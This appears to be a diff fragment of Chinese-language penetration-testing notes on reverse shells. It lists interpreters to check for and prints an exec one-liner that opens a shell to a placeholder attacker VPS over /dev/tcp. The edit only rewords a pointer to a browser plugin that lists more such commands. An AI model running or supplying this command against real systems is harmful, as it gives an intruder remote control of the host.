@@ -5,7 +5,8 @@ whereis bash nc python php exec perl ruby telnet
 
 用exec反弹shell：
 0<&196;exec 196<>/dev/tcp/<your_vps>/1024; sh <&196 >&196 2>&196
-其他命令可通过浏览器插件Hack-Tools查看
+
+其他反弹shell命令可通过浏览器插件Hack-Tools查看
 ```
 2、禁止向外流量的检查方法
 ```
